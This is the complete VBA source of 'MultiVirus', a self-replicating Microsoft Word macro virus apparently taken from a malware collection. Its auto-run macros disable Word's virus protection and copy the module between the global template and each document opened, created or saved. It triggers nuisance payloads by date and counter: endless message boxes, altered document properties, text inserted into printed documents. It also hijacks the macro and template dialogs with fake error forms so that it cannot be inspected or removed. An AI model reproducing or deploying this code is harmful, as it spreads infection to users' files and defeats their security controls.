   Attribute VB_Name = "MultiVirus"
   Sub AutoExec()
   Attribute AutoExec.VB_Description = "Macro créée par ZeMacroKiller98"
   Attribute AutoExec.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.AutoExec"
   ' WM.Clock
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   On Error GoTo errorAE
   Dim MyDate, MyTime, PauseTime, Start, Finish, TotalTime
   MyDate = Date
   D$ = Mid(MyDate, 1, 2)
   MyTime = Time
   If D$ = "25" Then
       MsgBox "Il est " & MyTime, Title:="Clock"
   Clock:
       PauseTime = 120
       Start = Timer
       Do While Timer < Start + PauseTime
           DoEvents
       Loop
       Finish = Timer
       TotalTime = Finish - Start
       MsgBox "Il est " & MyTime, Title:="Clock"
   GoTo Clock
   Else
       End
   End If
   errorAE:
   End Sub
   Sub AutoNew()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   On Error GoTo ErrorAN
   Dim MyDate
   MyDate = Date
   D1$ = Mid(MyDate, 1, 2)
   If (D1$ = "2") Or (D1$ = "7") Or (D1$ = "11") Or (D1$ = "12") Then
   Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="MultiVirus", Object:=wdOrganizerObjectProjectItems
       With Dialogs(wdDialogFileSummaryInfo)
           .Subject = "You Have been infected by the Alliance 98"
           .Execute
       End With
   End If
   ErrorAN:
   End Sub
   Sub AutoOpen()
   Attribute AutoOpen.VB_Description = "Macro créée ZeMacroKiller98"
   Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.AutoOpen"
   '
   ' AutoOpen Macro
   '
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   On Error GoTo ErrorAO
   Dim MyDate, MyTime, MyWeek, NbreCarac, NomFichier
   MyDate = Date
   D$ = Mid(MyDate, 1, 5)
   D1$ = Mid(MyDate, 1, 2)
   MyWeek = WeekDay(MyDate, vbMonday)
   NomFichier = ActiveDocument.Name
   NbreCarac = Len(NomFichier)
   iMacroCount = WordBasic.CountMacros(0, 0)
   For i = 1 To iMacroCount
       If WordBasic.[MacroName$](i, 0) = "MultiVirus" Then
           bInstalled = -1
       End If
   Next i
   ' WM.Concept
   If Not bInstalled Then
       MsgBox "1"
       Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="MultiVirus", Object:=wdOrganizerObjectProjectItems
   Else
       Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="MultiVirus", Object:=wdOrganizerObjectProjectItems
   End If
   ' WM.Alien
   If D$ = "01/08" Then
       MsgBox "Hides the program manager", vbCritical, "Another Year of Survival..."
   End If
   If MyWeek = "7" Then
       MsgBox "Closes current file", vbCritical, "It's Sunday & I intend to relax!"
   End If
   If NomFichier < 9 Then
       MsgBox "", Title:="Longer File Names Should Be Used"
   End If
   'WM.Alliance
   If (D1$ = "2") Or (D1$ = "7") Or (D1$ = "11") Or (D1$ = "12") Then
       With Dialogs(wdDialogFileSummaryInfo)
           .Subject = "You Have been infected by the Alliance 98"
           .Execute
       End With
   End If
   'WM.Npad.A
   WOpen$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "Compteur", "Winword8.ini")
   Sales = WordBasic.Val(WOpen$) + 1
   WordBasic.SetPrivateProfileString "Microsoft Word", "Compteur", Str(Sales), "Winword8.ini"
   WOpen$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "Compteur", "Winword8.ini")
   If WOpen$ = 23 Then
       StatusBar = "                                                                                                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                                                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                                                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                                                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                               DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                           DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                       DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                   DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                               DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                           DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                       DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                   DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "               DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "           DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "       DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "   DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "   DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "       DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "           DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "               DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                   DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                       DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                           DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                               DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                   DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                       DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                           DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                               DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                                                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                                                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                                                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
       StatusBar = "                                                                                                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
       For i = 1 To 400000
       Next i
   WordBasic.SetPrivateProfileString "Microsoft Word", "Compteur", "1", "Winword8.ini"
   End If
   ErrorAO:
   End Sub
   Sub FileSaveAs()
   Attribute FileSaveAs.VB_Description = "Macro créee par ZeMacroKiller98"
   Attribute FileSaveAs.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.FileSaveAs"
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   On Error GoTo ErrorFSA
       Dialogs(wdDialogFileSaveAs).Show
   Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="MultiVirus", Object:=wdOrganizerObjectProjectItems
   ActiveDocument.Save
   ErrorFSA:
   If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
       ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
   End If
   End Sub
   Sub FilePrint()
   Attribute FilePrint.VB_Description = "Macro crée par ZeMacroKiller98"
   Attribute FilePrint.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.FilePrint"
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   On Error GoTo ErrorFP
   InsertPayload
       Dialogs(wdDialogFilePrint).Show
   ErrorFP:
   End Sub
   Sub FilePrintDefault()
   Attribute FilePrintDefault.VB_Description = "Macro créee par ZeMacroKiller98"
   Attribute FilePrintDefault.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.FilePrintDefault"
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   On Error GoTo ErrorFPD
   InsertPayload
       ActiveDocument.PrintOut
   ErrorFPD:
   End Sub
   Sub FileTemplates()
   Attribute FileTemplates.VB_Description = "Macro créee par ZeMacroKiller98"
   Attribute FileTemplates.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.FileTemplates"
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   On Error GoTo ErrorFT
       UserForm900.Show
   ErrorFT:
   End Sub
   Sub InsertPayload()
   Attribute InsertPayload.VB_Description = "Macro créee par ZeMacroKiller98"
   Attribute InsertPayload.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.InsertPayload"
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   On Error GoTo ErrorIP
   Dim WPrint$, Adding
   WPrint$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "NbrePrint", "Nuclear98.ini")
   Adding = WordBasic.Val(WPrint$) + 1
   WordBasic.SetPrivateProfileString "Microsoft Word", "NbrePrint", Str(Adding), "Nuclear98.ini"
   WPrint$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "NbrePrint", "Nuclear98.ini")
   If WPrint$ = 12 Then
       Selection.EndKey Unit:=wdLine
       Selection.TypeParagraph
       Selection.TypeText Text:="And finally i would like to say"
       Selection.TypeParagraph
       Selection.TypeParagraph
       Selection.TypeText Text:="STOP ALL FRENCH NUCLEAR TESTING IN THE PACIFIC!"
       Selection.HomeKey Unit:=wdLine
       Selection.EndKey Unit:=wdLine, Extend:=wdExtend
       Selection.Font.Bold = wdToggle
       WordBasic.SetPrivateProfileString "Microsoft Word", "NbrePrint", "1", "Nuclear98.ini"
   End If
   ErrorIP:
   End Sub
   Sub ToolsMacro()
   Attribute ToolsMacro.VB_Description = "Macro créee par ZeMacroKiller98"
   Attribute ToolsMacro.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.ToolsMacro"
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   On Error GoTo ErrorTM
       UserForm999.Show
   ErrorTM:
   End Sub
   Sub ViewVBCode()
   Attribute ViewVBCode.VB_Description = "Macro créee par ZeMacroKiller98"
   Attribute ViewVBCode.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.ViewVBCode"
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   On Error GoTo ErrorVVBC
       MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
   ErrorVVBC:
   End Sub

   VERSION 5.00
   Begin {C62A69F0-16DC-11CE-9E98-00AA00574A4F} UserForm900
      Caption         =   "Modèles et compléments"
      ClientHeight    =   4275
      ClientLeft      =   45
      ClientTop       =   330
      ClientWidth     =   4965
      OleObjectBlob   =   "Virus.MSWord.MultiVirus.5-UserForm900.frx":0000
      StartUpPosition =   1  'CenterOwner
   End
   Attribute VB_Name = "UserForm900"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False




   Private Sub CommandButton1_Click()
   MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
   Unload UserForm900
   End Sub

   Private Sub CommandButton2_Click()
   MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
   Unload UserForm900
   End Sub

   Private Sub CommandButton3_Click()
   MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
   Unload UserForm900
   End Sub

   Private Sub CommandButton4_Click()
   MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
   Unload UserForm900
   End Sub

   Private Sub CommandButton5_Click()
   MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
   Unload UserForm900
   End Sub

   Private Sub CommandButton6_Click()
   Unload UserForm900
   End Sub

   Private Sub UserForm_Initialize()
       TextBox1.Text = NormalTemplate.Name
       CommandButton2.Enabled = False
       CommandButton3.Enabled = False
       CommandButton4.Enabled = False
   End Sub

   VERSION 5.00
   Begin {C62A69F0-16DC-11CE-9E98-00AA00574A4F} UserForm999
      Caption         =   "Macros"
      ClientHeight    =   5070
      ClientLeft      =   45
      ClientTop       =   330
      ClientWidth     =   6780
      OleObjectBlob   =   "Virus.MSWord.MultiVirus.5-UserForm999.frx":0000
      StartUpPosition =   1  'CenterOwner
   End
   Attribute VB_Name = "UserForm999"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False






   Private Sub ListBox1_Click()
       If ListBox1.Selected(0) = True Then
           CommandButton1.Enabled = True
           CommandButton3.Enabled = True
           CommandButton4.Enabled = True
           CommandButton6.Enabled = True
       ElseIf ListBox1.Selected(1) = True Then
           CommandButton1.Enabled = True
           CommandButton3.Enabled = True
           CommandButton4.Enabled = True
           CommandButton6.Enabled = True
       Else
           CommandButton1.Enabled = False
           CommandButton3.Enabled = False
           CommandButton4.Enabled = False
           CommandButton6.Enabled = False
       End If
   End Sub

   Private Sub UserForm_Initialize()
       ComboBox1.AddItem "Commande Word"
       ComboBox1.AddItem "Tous les modèles actifs"
       ComboBox1.AddItem "Normal.dot (modèle global)"
       ComboBox1.AddItem WordBasic.WindowName$()
       CommandButton1.Enabled = False
       CommandButton3.Enabled = False

   End Sub

   Private Sub CommandButton1_Click()
   MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
   Unload UserForm999
   End Sub
   Private Sub CommandButton2_Click()
   Unload UserForm999
   End Sub

   Private Sub CommandButton3_Click()
   MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
   Unload UserForm999
   End Sub

   Private Sub CommandButton4_Click()
   MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
   Unload UserForm999
   End Sub

   Private Sub CommandButton5_Click()
   MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
   Unload UserForm999
   End Sub

   Private Sub CommandButton6_Click()
   MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
   Unload UserForm999
   End Sub

   Private Sub CommandButton7_Click()
   MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
   Unload UserForm999
   End Sub
   Private Sub ScrollBar1_Change()
   MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
   Unload UserForm999
   End Sub
